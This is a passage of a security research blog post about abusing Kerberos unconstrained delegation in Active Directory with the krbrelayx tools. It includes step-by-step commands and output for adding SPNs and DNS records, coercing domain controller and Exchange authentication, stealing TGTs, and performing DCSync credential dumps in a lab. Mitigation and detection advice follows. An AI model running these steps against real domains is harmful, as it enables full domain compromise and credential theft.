+    sAMAccountName: W10-OUTLOOK$
+    servicePrincipalName: TERMSRV/TESTME
+                          TERMSRV/testme.testsegment.local
+                          WSMAN/TESTME
+                          WSMAN/testme.testsegment.local
+</code></pre></div></div>
+
+<p>If for whatever reason we can’t modify the SPN to a hostname under the attackers control, we can always hijack the current SPN by modifying the DNS record or using your favourite spoofing/mitm attack, though this will break connectivity to the host, which I wouldn’t recommend in production environments.</p>
+
+<h3 id="permissions-to-addmodify-dns-records">Permissions to add/modify DNS records</h3>
+<p>After adding a new SPN that points to a hostname not in use on the network, we of course need to make sure the hostname we added resolves to our own IP. If the network you are in uses Active Directory-Integrated DNS, this should be straightforward. As Kevin Robertson described in <a href="https://blog.netspi.com/exploiting-adidns/">his blog about ADIDNS</a>, by default any authenticated user can create new DNS records, as long as there is no record yet for the hostname. So after we add the SPN for <code class="language-plaintext highlighter-rouge">attacker.corp.com</code> to our unconstrained delegation account, we can add a record for this hostname that points to our IP using for example PowerMad (different hostname used as example):</p>
+
+<p><img src="/assets/img/kerberos/powermad.png" alt="powermad" class="align-center"></p>
+
+<p>I also added a tool to the krbrelayx repo that can perform DNS modifications (<code class="language-plaintext highlighter-rouge">dnstool.py</code>) in AD over LDAP:</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>user@localhost:~/adtools$ python dnsparse.py -u icorp\\testuser icorp-dc.internal.corp -r attacker -a add -d 10.1.1.2 
+Password: 
+[-] Connecting to host...
+[-] Binding to host
+[+] Bind OK
+[-] Adding new record
+[+] LDAP operation completed successfully
+</code></pre></div></div>
+<p>Afterwards we can see the record exists in DNS:</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>user@localhost:~/adtools$ python dnsparse.py -u icorp\\testuser icorp-dc.internal.corp -r attacker -a query
+Password: 
+[-] Connecting to host...
+[-] Binding to host
+[+] Bind OK
+[+] Found record attacker
+DC=attacker,DC=internal.corp,CN=MicrosoftDNS,DC=DomainDnsZones,DC=internal,DC=corp
+[+] Record entry:
+ - Type: 1 (A) (Serial: 36)
+ - Address: 10.1.1.2
+</code></pre></div></div>
+<p>And the record resolves after the DNS server refreshes the records from LDAP (which by default takes place every 180 seconds):</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>user@localhost:~/adtools$ nslookup attacker.internal.corp 192.168.111.2
+Server:		192.168.111.2
+Address:	192.168.111.2#53
+
+Name:	attacker.internal.corp
+Address: 10.1.1.2
+</code></pre></div></div>
+
+<p>The <code class="language-plaintext highlighter-rouge">dnstool.py</code> utility has several other options, including one to remove records again after exploitation, which I won’t go into in this post, but you can get the tool <a href="https://github.com/dirkjanm/krbrelayx/">on GitHub</a>. If modifying DNS does not work or the network you are in does not use AD for DNS, it is always possible to perform network attacks to take over the DNS server, though this often requires you to be in the same VLAN as the system. A way which should always work is modifying the compromised computers own DNS record, but this is almost a guarantee to break stuff and might take a while to propagate because of DNS caching.</p>
+
+<h3 id="obtaining-traffic">Obtaining traffic</h3>
+<p>There are a multitude of ways now to obtain traffic from users to the attackers host. Any technique on the internet discussing NTLM authentication gathering techniques will work for getting users to authenticate to your rogue SMB or HTTP server. Some options are:</p>
+
+<ul>
+  <li>Phishing sites with a UNC path or redirect</li>
+  <li>Using <a href="https://github.com/lgandx/Responder">responder</a>, <a href="https://github.com/Kevin-Robertson/Inveigh">Inveigh</a> or metasploit to reply to LLMNR/NBNS requests</li>
+  <li>Using <a href="https://github.com/fox-it/mitm6">mitm6</a> for DNS hijacking</li>
+  <li>Placing files with an icon linking to a UNC path on a popular file share within the network</li>
+  <li>Etc</li>
+</ul>
+
+<p>Two very effective to obtain Domain Admin (equivalent) privileges via unconstrained delegation at the point of writing of this blog is to abuse bugs that require only regular user credentials to make a high value target connect to you. At this point, two important example are known:</p>
+
+<ul>
+  <li><strong>SpoolService bug</strong>: There is a Remote Procedure Call part of the MS-RPRN protocol which causes remote computers to authenticate to arbitrary hosts via SMB. This was discovered by Lee Christensen aka <a href="https://twitter.com/tifkin_">@tifkin_</a> and called the “printer bug”. Harmj0y recently did a write-up on abusing this bug as well to perform unconstrained delegation attacks over forest trusts <a href="http://www.harmj0y.net/blog/redteaming/not-a-security-boundary-breaking-forest-trusts/">in his blog</a>. The MS-RPRN protocol was also implemented in <a href="https://github.com/SecureAuthCorp/impacket">impacket</a> by <a href="https://twitter.com/agsolino/">@agsolino</a>, and of course I couldn’t resist writing a small utility for it as part of the krbrelayx toolkit, called <code class="language-plaintext highlighter-rouge">printerbug.py</code>, which triggers the backconnect.</li>
+  <li><strong>PrivExchange</strong>: The Exchange Web Services (EWS) SOAP API exposes a method that subscribes to push notifications. This method can be called by any user with a mailbox and will make Exchange connect to any host we specify via HTTP. When requested, Exchange will (unless it is patched with the latest CU) authenticate with the computer account of the system Exchange is running on. This computer account has high privileges in the domain by default. I wrote about this in my <a href="https://dirkjanm.io/abusing-exchange-one-api-call-away-from-domain-admin/">previous blog</a> and the <code class="language-plaintext highlighter-rouge">privexchange.py</code> tool is available <a href="https://github.com/dirkjanm/PrivExchange">here</a>. Apart from NTLM relaying this authentication to LDAP, we can also use unconstrained delegation to obtain Exchange’s TGT and use that to perform an ACL based privilege escalation.</li>
+</ul>
+
+<h1 id="use-case-1-gaining-dc-sync-privileges-using-a-computer-account-and-the-spoolservice-bug">Use case 1: Gaining DC Sync privileges using a computer account and the SpoolService bug</h1>
+<p>In the first case we will abuse the unconstrained delegation privileges of a computer account in my <code class="language-plaintext highlighter-rouge">internal.corp</code> lab domain. We have obtained administrative privileges on this host by compromising the user <code class="language-plaintext highlighter-rouge">testuser</code>, which is a member of the Administrators group on this host. We will follow the steps outlined above, and first obtain the Kerberos keys and NTLM hashes:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>user@localhost:~$ secretsdump.py testuser@icorp-w10.internal.corp
+Impacket v0.9.19-dev - Copyright 2018 SecureAuth Corporation
+
+Password:
+[*] Service RemoteRegistry is in stopped state
+[*] Service RemoteRegistry is disabled, enabling it
+[*] Starting service RemoteRegistry
+[*] Target system bootKey: 0x38f3153a77837cf2c5d04b049727a771
+...cut...
+[*] Dumping LSA Secrets
+[*] $MACHINE.ACC 
+ICORP\ICORP-W10$:aes256-cts-hmac-sha1-96:9ff86898afa70f5f7b9f2bf16320cb38edb2639409e1bc441ac417fac1fed5ab
+ICORP\ICORP-W10$:aes128-cts-hmac-sha1-96:a6e34ed07f7bffba151fedee4d6640fd
+ICORP\ICORP-W10$:des-cbc-md5:91abd073c7a8e534
+ICORP\ICORP-W10$:aad3b435b51404eeaad3b435b51404ee:c1c635aa12ae60b7fe39e28456a7bac6:::
+</code></pre></div></div>
+
+<p>Now we add the SPN. We use the NTLM hash that we just dumped to authenticate as the machine account, which can modify it’s own SPN, but only via the <code class="language-plaintext highlighter-rouge">msDS-AdditionalDnsHostName</code> property as discussed earlier. We will use the <code class="language-plaintext highlighter-rouge">addspn.py</code> utility to add the SPN <code class="language-plaintext highlighter-rouge">HOST/attacker.internal.corp</code> to the computer account (which is used for SMB).</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>user@localhost:~/krbrelayx$ python addspn.py -u icorp\\icorp-w10\$ -p aad3b435b51404eeaad3b435b51404ee:c1c635aa12ae60b7fe39e28456a7bac6 -s HOST/attacker.internal.corp -q icorp-dc.internal.corp
+[-] Connecting to host...
+[-] Binding to host
+[+] Bind OK
+[+] Found modification target
+DN: CN=ICORP-W10,CN=Computers,DC=internal,DC=corp - STATUS: Read - READ TIME: 2019-01-09T21:55:23.923810
+    dNSHostName: ICORP-W10.internal.corp
+    sAMAccountName: ICORP-W10$
+    servicePrincipalName: RestrictedKrbHost/ICORP-W10
+                          HOST/ICORP-W10
+                          RestrictedKrbHost/ICORP-W10.internal.corp
+                          HOST/ICORP-W10.internal.corp
+
+user@localhost:~/krbrelayx$ python addspn.py -u icorp\\icorp-w10\$ -p aad3b435b51404eeaad3b435b51404ee:c1c635aa12ae60b7fe39e28456a7bac6 -s HOST/attacker.internal.corp icorp-dc.internal.corp
+[-] Connecting to host...
+[-] Binding to host
+[+] Bind OK
+[+] Found modification target
+[!] Could not modify object, the server reports a constrained violation
+[!] You either supplied a malformed SPN, or you do not have access rights to add this SPN (Validated write only allows adding SPNs matching the hostname)
+[!] To add any SPN in the current domain, use --additional to add the SPN via the msDS-AdditionalDnsHostName attribute
+user@localhost:~/krbrelayx$ python addspn.py -u icorp\\icorp-w10\$ -p aad3b435b51404eeaad3b435b51404ee:c1c635aa12ae60b7fe39e28456a7bac6 -s HOST/attacker.internal.corp icorp-dc.internal.corp --additional
+[-] Connecting to host...
+[-] Binding to host
+[+] Bind OK
+[+] Found modification target
+[+] SPN Modified successfully
+</code></pre></div></div>
+
+<p>The SPN for <code class="language-plaintext highlighter-rouge">attacker.internal.corp</code> now exists on the victim account, but the DNS entry for it does not yet exist.	We use the <code class="language-plaintext highlighter-rouge">dnstool.py</code> utility to add the record, pointing to the attacker IP:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>user@localhost:~/krbrelayx$ python dnstool.py -u icorp\\icorp-w10\$ -p aad3b435b51404eeaad3b435b51404ee:c1c635aa12ae60b7fe39e28456a7bac6 -r attacker.internal.corp -d 192.168.111.87 --action add icorp-dc.internal.corp
+[-] Connecting to host...
+[-] Binding to host
+[+] Bind OK
+[-] Adding new record
+[+] LDAP operation completed successfully
+user@localhost:~/krbrelayx$ nslookup attacker.internal.corp 192.168.111.2
+Server:		192.168.111.2
+Address:	192.168.111.2#53
+
+Name:	attacker.internal.corp
+Address: 192.168.111.87
+</code></pre></div></div>
+<p>Now we get the Domain Controller to authenticate to us via the printer bug, while we start krbrelayx in export mode, in which all extracted TGTs will be saved to disk. We provide the AES256 key to krbrelayx, since this key will be used by default for computer accounts.</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>user@localhost:~/krbrelayx$ python printerbug.py -hashes aad3b435b51404eeaad3b435b51404ee:c1c635aa12ae60b7fe39e28456a7bac6 internal.corp/icorp-w10\$@icorp-dc.internal.corp attacker.internal.corp
+[*] Impacket v0.9.19-dev - Copyright 2018 SecureAuth Corporation
+
+[*] Attempting to trigger authentication via rprn RPC at icorp-dc.internal.corp
+[*] Bind OK
+[*] Got handle
+DCERPC Runtime Error: code: 0x5 - rpc_s_access_denied 
+[*] Triggered RPC backconnect, this may or may not have worked
+</code></pre></div></div>
+<p>krbrelayx on a different screen:</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>user@localhost:~/krbrelayx$ sudo python krbrelayx.py -aesKey 9ff86898afa70f5f7b9f2bf16320cb38edb2639409e1bc441ac417fac1fed5ab
+[*] Protocol Client LDAPS loaded..
+[*] Protocol Client LDAP loaded..
+[*] Protocol Client SMB loaded..
+[*] Running in export mode (all tickets will be saved to disk)
+[*] Setting up SMB Server
+
+[*] Setting up HTTP Server
+[*] Servers started, waiting for connections
+[*] SMBD: Received connection from 192.168.111.2
+[*] Got ticket for ICORP-DC$@INTERNAL.CORP [krbtgt@INTERNAL.CORP]
+[*] Saving ticket in ICORP-DC$@INTERNAL.CORP_krbtgt@INTERNAL.CORP.ccache
+[*] SMBD: Received connection from 192.168.111.2
+</code></pre></div></div>
+<p>This gives us a TGT of the domain controller account, which has DC Sync privileges in the domain, meaning we can extract the hashes of all the accounts in the directory.</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>user@localhost:~/krbrelayx$ export KRB5CCNAME=ICORP-DC\$@INTERNAL.CORP_krbtgt@INTERNAL.CORP.ccache
+user@localhost:~/krbrelayx$ secretsdump.py -k icorp-dc.internal.corp -just-dc
+Impacket v0.9.19-dev - Copyright 2018 SecureAuth Corporation
+
+[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
+[*] Using the DRSUAPI method to get NTDS.DIT secrets
+Administrator:500:aad3b435b51404eeaad3b435b51404ee:a39494027fd39934e08a713c999e8cf3:::
+Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+krbtgt:502:aad3b435b51404eeaad3b435b51404ee:33168b759a89c059815d7aea5c27a3d9:::
+...etc...
+</code></pre></div></div>
+
+<h1 id="use-case-2-abusing-a-service-account-and-privexchange">Use case 2: Abusing a service account and PrivExchange</h1>
+<p>The previous use case used a computer account and an SMB connection to obtain the TGT of a DC. While the above described method is the only way to perform this attack without executing code on the compromised host (all data is obtained via RPC calls, and the DC only connects to the attacker machine), usually it would be easier to trigger an SMB connection to the compromised host, dump LSASS memory and/or use Mimikatz or Rubeus to extract the TGTs from memory. This would not require modifying DNS records and SPNs.
+In the next case we will be using a user account (that is used as a service account) instead of a computer account. This is more complex or even impossible to exploit without modifying information in AD. If the user account is for example used for an MSSQL service, it would only be possible to extract the TGT from LSASS if we could somehow convince a victim to connect to the MSSQL service <strong>and</strong> also have Administrative access to the server to run the code that extracts the tickets from memory. By adding an extra SPN to the user account we can use existing tools such as the SpoolService bug or PrivExchange to exploit this via HTTP or SMB, without the need to touch the host on which this service is running at all.</p>
+
+<p>This requires two things:</p>
+<ul>
+  <li>The password of the service account</li>
+  <li>Delegated control over the service account object</li>
+</ul>
+
+<p>The password for the service account could have been previously obtained using a Kerberoast or password spraying attack. Delegated control over the account is required to add an SPN to the account, this control could be present because the service account is part of an Organisational Unit over which control was delegated to a sysadmin, or because we compromised an account in a high privilege group, such as Account Operators.</p>
+
+<p>In this scenario we have control over a <code class="language-plaintext highlighter-rouge">helpdesk</code> user, which has been delegated the rights to manage users in the <code class="language-plaintext highlighter-rouge">Service Accounts</code> OU. We also discovered that the service account <code class="language-plaintext highlighter-rouge">sqlserv</code> has the weak password <code class="language-plaintext highlighter-rouge">Internal01</code> set. This service account only has an SPN for the MSSQL service running on <code class="language-plaintext highlighter-rouge">database.internal.corp</code>. Since we want to escalate privileges via Exchange with PrivExchange, which connects over HTTP, we add a new SPN using this account for <code class="language-plaintext highlighter-rouge">http/evil.internal.corp</code>:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>user@localhost:~/krbrelayx$ python addspn.py -u icorp\\helpdesk -p Welkom01 -t sqlserv -s http/evil.internal.corp -q icorp-dc.internal.corp
+[-] Connecting to host...
+[-] Binding to host
+[+] Bind OK
+[+] Found modification target
+DN: CN=sqlserv,OU=Service Accounts,DC=internal,DC=corp - STATUS: Read - READ TIME: 2019-01-27T15:26:16.580450
+    sAMAccountName: sqlserv
+    servicePrincipalName: MSSQL/database.internal.corp
+user@localhost:~/krbrelayx$ python addspn.py -u icorp\\helpdesk -p Welkom01 -t sqlserv -s http/evil.internal.corp icorp-dc.internal.corp
+[-] Connecting to host...
+[-] Binding to host
+[+] Bind OK
+[+] Found modification target
+[+] SPN Modified successfully
+</code></pre></div></div>
+<p>As with the previous attack we add a DNS record to point to our attackers IP:</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>user@localhost:~/krbrelayx$ python dnstool.py -u icorp\\helpdesk -p Welkom01 -r evil.internal.corp -d 192.168.111.87 --action add icorp-dc.internal.corp 
+[-] Connecting to host...
+[-] Binding to host
+[+] Bind OK
+[-] Adding new record
+[+] LDAP operation completed successfully
+</code></pre></div></div>
+<p>Now we can start krbrelayx.py. Since we are working with a user account, by default tickets will be encrypted with RC4, so we need to calculate the NTLM hash of the password in order to decrypt them (we don’t need to bother with a Kerberos salt here because RC4 doesn’t use one).</p>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kn">import</span> <span class="nn">hashlib</span>
+<span class="k">print</span><span class="p">(</span><span class="n">hashlib</span><span class="p">.</span><span class="n">new</span><span class="p">(</span><span class="s">'md4'</span><span class="p">,</span> <span class="s">'Internal01'</span><span class="p">.</span><span class="n">encode</span><span class="p">(</span><span class="s">'utf-16le'</span><span class="p">)).</span><span class="n">hexdigest</span><span class="p">())</span>
+</code></pre></div></div>
+<p>This hash we can pass to krbrelayx.py and we can start the server. This time instead of exporting the ticket we use it directly to connect to LDAP and grant our helpdesk user DCSync privileges using the <code class="language-plaintext highlighter-rouge">-t ldap://icorp-dc.internal.corp</code> flag. We run <code class="language-plaintext highlighter-rouge">privexchange.py</code> and <code class="language-plaintext highlighter-rouge">krbrelayx.py</code> at the same time:</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>user@localhost:~/privexchange$ python privexchange.py -u helpdesk -p Welkom01 -ah evil.internal.corp exchange.internal.corp -d internal.corp
+INFO: Using attacker URL: http://evil.internal.corp/privexchange/
+INFO: Exchange returned HTTP status 200 - authentication was OK
+INFO: API call was successful
+</code></pre></div></div>
+<p>And see the attack doing it’s work in a very similar way to ntlmrelayx:</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>user@localhost:~/krbrelayx$ sudo python krbrelayx.py -hashes aad3b435b51404eeaad3b435b51404ee:d3026ba6ef6215da295175934b3d0e09 -t ldap://icorp-dc.internal.corp --escalate-user helpdesk
+[*] Protocol Client LDAP loaded..
+[*] Protocol Client LDAPS loaded..
+[*] Protocol Client SMB loaded..
+[*] Running in attack mode to single host
+[*] Setting up SMB Server
+[*] Setting up HTTP Server
+
+[*] Servers started, waiting for connections
+[*] HTTPD: Received connection from 192.168.111.56, prompting for authentication
+[*] HTTPD: Client requested path: /privexchange/
+[*] HTTPD: Received connection from 192.168.111.56, prompting for authentication
+[*] HTTPD: Client requested path: /privexchange/
+[*] Got ticket for EXCHANGE$@INTERNAL.CORP [krbtgt@INTERNAL.CORP]
+[*] Saving ticket in EXCHANGE$@INTERNAL.CORP_krbtgt@INTERNAL.CORP.ccache
+[*] Enumerating relayed user's privileges. This may take a while on large domains
+[*] User privileges found: Create user
+[*] User privileges found: Modifying domain ACL
+[*] Querying domain security descriptor
+[*] Success! User helpdesk now has Replication-Get-Changes-All privileges on the domain
+[*] Try using DCSync with secretsdump.py and this user :)
+[*] Saved restore state to aclpwn-20190210-132437.restore
+</code></pre></div></div>
+<p>The advantage (for an attacker) of this is that this uses Kerberos functionality instead of NTLM relaying, and thus mitigations against NTLM relaying do not apply (but it does require much higher privileges to perform). We could also have avoided calculating the Kerberos hashes manually and specified those on the command line with the correct salt, which makes krbrelayx calculate all the keys by itself:</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>python krbrelayx.py --krbpass Internal01 --krbsalt INTERNAL.CORPsqlserv -t ldap://icorp-dc.internal.corp --escalate-user helpdesk
+</code></pre></div></div>
+
+<h1 id="technical-details---unconstrained-delegation-flow">Technical details - Unconstrained delegation flow</h1>
+<p>The previous paragraphs show us how we can abuse unconstrained delegation, but we haven’t yet touched on how it all works under the hood.
+Let’s have a look at how a Windows 10 client uses Kerberos with unconstrained delegation. Some write-ups mention that whenever the Windows 10 client requests a service ticket to a host with unconstrained delegation, this ticket automatically includes a delegated version of a TGT. This is not how it actually works. Let’s look at what happens over the wire when a host authenticates to our attacker service.</p>
+
+<p>When our user (testuser) logs in on the workstation, a TGT is requested from the DC (the KDC in this case). This is visible via two AS-REQs, the initial one which requests the TGT without any kind of information, and a second one in which pre-authentication information is included.</p>
+
+<p><img src="/assets/img/kerberos/krbflow-1.png" alt="Kerberos TGT request" class="align-center"></p>
+
+<p>In the reply to the first AS-REQ, we see that the server replies with the correct salt that should be used in case of AES key derivation  from the password:</p>
+
+<p><img src="/assets/img/kerberos/krbsalt.png" alt="Kerberos salt information" class="align-center"></p>
+
+<p>Now we make the client connect to our malicious SMB server hosted using krbrelayx. In the traffic we see two requests for a service ticket (TGS-REQ), and after some SMB traffic in which the Kerberos authentication is performed.</p>
+
+<p><img src="/assets/img/kerberos/krbflow-2.png" alt="Kerberos TGS requests" class="align-center"></p>
+
+<p>Let’s take a closer look at these TGS requests. The first one is as expected, a service ticket is requested for the <code class="language-plaintext highlighter-rouge">cifs/attacker.internal.corp</code> SPN which we added to our account previously.</p>
+
+<p><img src="/assets/img/kerberos/krbflow-tgsreq1.png" alt="Kerberos request for service ticket" class="align-center"></p>
+
+<p>The second one however is interesting. This time the server requests a service ticket not for the service it is connecting to, but for the <code class="language-plaintext highlighter-rouge">krbtgt/internal.corp</code> SPN. This is similar to an AS-REQ request, in which this SPN is also used, but now it’s used in a TGS-REQ structure using the TGT with an authenticator. The second interesting part are the flags, especially the <code class="language-plaintext highlighter-rouge">forwarded</code> flag. This flag is used to request a TGT which can be used for delegation and will later be sent to the attacker’s rogue service.</p>
+
+<p><img src="/assets/img/kerberos/krb-tgs-req-2.png" alt="Kerberos request for delegation ticket" class="align-center"></p>
+
+<p>How does Windows know whether it should request a forwarded TGT and send this to a server when authenticating? The encrypted ticket part has a ‘flags’ field, in which the ticket options are specified. RFC4120 defines an <a href="https://tools.ietf.org/html/rfc4120#section-2.8">OK-AS-DELEGATE</a> flag, which specifies that the target server is trusted for unconstrained delegation. Some changes made to getST.py from impacket show us that this flag is indeed set, it is easier however to just list the tickets in Windows with <code class="language-plaintext highlighter-rouge">klist</code>:</p>
+
+<p><img src="/assets/img/kerberos/ok-as-delegate.png" alt="Service ticket with ok-as-delegate flag set" class="align-center"></p>
+
+<p>This command also shows us the <code class="language-plaintext highlighter-rouge">forwarded</code> TGT that will be sent to the attacker:</p>
+
+<p><img src="/assets/img/kerberos/forwarded-tgt.png" alt="TGT with forwarded flag set" class="align-center"></p>
+
+<h2 id="the-attackers-view">The attackers view</h2>
+<p>From the attackers perspective, we have set up <code class="language-plaintext highlighter-rouge">krbrelayx</code> and it is listening on port 445 and 80 to accept SMB and HTTP connections.
+When the victim connects to us (for which examples to trigger this are given above), they will authenticate with Kerberos if we request this. Unlike with NTLM authentication, which requires multiple messages back and forth, a client will directly send their Kerberos ticket upon authenticating.
+In both SMB and HTTP the GSS-API and SPNEGO protocols are used to wrap Kerberos authentication.</p>
+
+<p>Whoever designed these protocols thought it would be a <strong>great idea</strong> to not only use ASN.1, but to <strong>mix ASN.1 with some custom binary constants</strong> in one structure (and to let part of that structure depend on the constant). This makes it pretty unusable with any standard ASN.1 library. Fortunately I did find some ways to hack around this, which is already an improvement on having to write your own ASN.1 parser.</p>
+
+<p><img src="/assets/img/kerberos/whyspnego.png" alt="Whywouldyoudothis" class="align-center"></p>
+
+<p>Once we reliably parsed the structure, we can see the <code class="language-plaintext highlighter-rouge">AP_REQ</code> message containing a Kerberos ticket and an authenticator. These are both important in Kerberos authentication:</p>
+
+<ul>
+  <li>The <strong>ticket</strong> is encrypted with the password of “our” service. It contains information that identifies the user who is authenticating, as well as an encrypted <strong>session key</strong>. This ticket is also used for <strong>authorization</strong>, since it contains a PAC with the groups the user is a member of.</li>
+  <li>The <strong>authenticator</strong> is an structure encrypted with the <strong>session key</strong>. It proves the client is in possession of this key and is used to <strong>authenticate</strong> the client.</li>
+</ul>
+
+<p>When you see this in Wireshark, it is easy to notice the difference between a regular Kerberos <code class="language-plaintext highlighter-rouge">AP_REQ</code> packet and one where a TGT is sent along with it (unconstrained delegation). A regular <code class="language-plaintext highlighter-rouge">AP_REQ</code> packet will contain an encrypted ticket, which is the largest substructure in the <code class="language-plaintext highlighter-rouge">AP_REQ</code> structure. In the case of my test domain, the ticket is 1180 bytes. If unconstrained delegation is used, the largest substructure in the <code class="language-plaintext highlighter-rouge">AP_REQ</code> is the authenticator, which contains the delegated TGT from the user. In my domain this is 1832 bytes. An authenticator that doesn’t contain a TGT is usually much smaller, around 400 bytes.</p>
+
+<p>Using the previously calculated Kerberos keys, we decrypt the ticket and get the following structure:</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>EncTicketPart:
+ flags=1084555264
+ key=EncryptionKey:
+  keytype=23
+  keyvalue=0xbd88d929fc420e8b840f3e4bcd9346b6
+ crealm=INTERNAL.CORP
+ cname=PrincipalName:
+  name-type=1
+  name-string=SequenceOf:
+   testuser
+ transited=TransitedEncoding:
+  tr-type=1
+  contents=
+ authtime=20190216190927Z
+ starttime=20190216190927Z
+ endtime=20190217050927Z
+ renew-till=20190223190927Z
+ authorization-data=AuthorizationData:
+  Sequence:
+   ad-type=1
+   ad-data=0x308202e230...e8bd0fb67130
+  Sequence:
+   ad-type=1
+   ad-data=0x305d303fa0...6517b0000000000
+</code></pre></div></div>
+<p>Contained within are the ticket validity, the username of the ticket, some Authorization Data (which includes the user <a href="https://dirkjanm.io/active-directory-forest-trusts-part-one-how-does-sid-filtering-work/">PAC</a>), and an Encryption key. This Encryption key is the <strong>session key</strong>, with which we can decrypt the authenticator of the <code class="language-plaintext highlighter-rouge">AP_REQ</code>:</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Authenticator:
+ authenticator-vno=5
+ crealm=INTERNAL.CORP
+ cname=PrincipalName:
+  name-type=1
+  name-string=SequenceOf:
+   testuser
+ cksum=Checksum:
+  cksumtype=32771
+  checksum=0x100000000...a3997
+ cusec=84
+ ctime=20190216192428Z
+ subkey=EncryptionKey:
+  keytype=23
+  keyvalue=0x2b340c020be62cbd6284fd2977c5e303
+ seq-number=1035294623
+ authorization-data=AuthorizationData:
+  Sequence:
+   ad-type=1
+   ad-data=0x3081...005000
+</code></pre></div></div>
+<p>Here we see again the user that authenticated, another encryption key (subkey), more authorization data, and a checksum (which I’ve cut short).
+The checksum is the interesting part. If it’s value is equal to 32771 (or <code class="language-plaintext highlighter-rouge">0x8003</code>) it means that it is a KRBv5 checksum, which is a special structure defined in <a href="https://tools.ietf.org/html/rfc4121#section-4.1.1">RFC4121 section 4.1.1</a> (apparently the authors of the RFC were also tired of ASN.1, introducing another custom format for transferring binary data).</p>
+
+<p>Within this checksum field, (if the correct flags are set), we can find a KRB_CRED structure (back to ASN.1!) which contains the delegated TGT.</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>KRB_CRED:
+ pvno=5
+ msg-type=22
+ tickets=SequenceOf:
+  Ticket:
+   tkt-vno=5
+   realm=INTERNAL.CORP
+   sname=PrincipalName:
+    name-type=2
+    name-string=SequenceOf:
+     krbtgt     INTERNAL.CORP
+   enc-part=EncryptedData:
+    etype=18
+    kvno=2
+    cipher=0xe70d38ec...c2ec0e
+ enc-part=EncryptedData:
+  etype=23
+  cipher=0xdea2c107a...850ba2a285
+</code></pre></div></div>
+<p>There is one more step separating us from obtaining our TGT, which is decrypting the <code class="language-plaintext highlighter-rouge">enc-part</code>. This encrypted part of the <code class="language-plaintext highlighter-rouge">KRB_CRED</code> structure contains the ticket information, including the session key associated with the delegated TGT, which we need to request service tickets at the DC.
+After decryption, the tickets are saved to disk, either in <code class="language-plaintext highlighter-rouge">ccache</code> format, which is used by impacket, or in <code class="language-plaintext highlighter-rouge">kirbi</code> format (which is the name used by Mimikatz for KRB_CRED structured files). The delegated TGT can now be used by other tools to authenticate to any system in the domain.</p>
+
+<p>If this wasn’t detailed enough for you yet, all the steps described in this section are outlined in the <a href="https://github.com/dirkjanm/krbrelayx/blob/master/lib/utils/kerberos.py">kerberos.py</a> file of krbrelayx. If you uncomment the <code class="language-plaintext highlighter-rouge">print</code> statements at various stages you can view the full structures.</p>
+
+<h1 id="mitigations-and-detection">Mitigations and detection</h1>
+<p>The most straightforward mitigation is to avoid using unconstrained delegation wherever possible. Constrained delegation is much safer and while it can be abused as well, constrained delegation only allows for authentication to services which you explicitly specify, making it possible to make a risk analysis for individual services. Unconstrained delegation makes this depend on whichever user connects to the service, which then has their credentials exposed. If running accounts with unconstrained delegation rights cannot be avoided, the following mitigations can be applied:</p>
+
+<ul>
+  <li>Make sure to guard the systems that have these privileges as sensitive assets from which domain compromise is likely possible.</li>
+  <li>Protect sensitive accounts by enabling the option “Account is sensitive and cannot be delegated” option.</li>
+  <li>Place administrative accounts in the “Protected Users” group, which will prevent their credentials from being delegated.</li>
+  <li>Make sure that administrative accounts perform their actions from up-to-date workstations with Credential Guard enabled, which will prevent credential delegation.</li>
+</ul>
+
+<p>Regarding detection, Roberto Rodriguez from Specterops <a href="https://posts.specterops.io/hunting-in-active-directory-unconstrained-delegation-forests-trusts-71f2b33688e1">wrote an article</a> a while back about the exact events involved with unconstrained delegation which allow detection of unconstrained delegation abuse.</p>
+
+<h1 id="tooling">Tooling</h1>
+<p>The tools are available on my GitHub: <a href="https://github.com/dirkjanm/krbrelayx">https://github.com/dirkjanm/krbrelayx</a>
+Please read the README for install instructions and TODO items/limitations!</p>
+
+<h1 id="references">References</h1>
+<ul>
+  <li><a href="https://adsecurity.org/?p=1667">Sean Metcalf’s blog about unconstrained delegation</a></li>
+  <li><a href="http://www.harmj0y.net/blog/redteaming/not-a-security-boundary-breaking-forest-trusts/">Harmj0y and tifkin_’s post about breaking forest trusts</a></li>
+  <li><a href="https://portal.msrc.microsoft.com/en-us/security-guidance/advisory/ADV190006">Microsoft guide with unconstrained delegation mitigations</a></li>
+  <li><a href="http://msdn.microsoft.com/enus/library/cc233855.aspx">MS-KILE Kerberos documentation</a></li>
+  <li><a href="https://tools.ietf.org/html/rfc4120">RFC 4120</a> and <a href="https://tools.ietf.org/html/rfc4121">RFC 4121</a></li>
+</ul>
+
+        
+      </section>
+
+      <footer class="page__meta">
+        
+        
+
+
+        
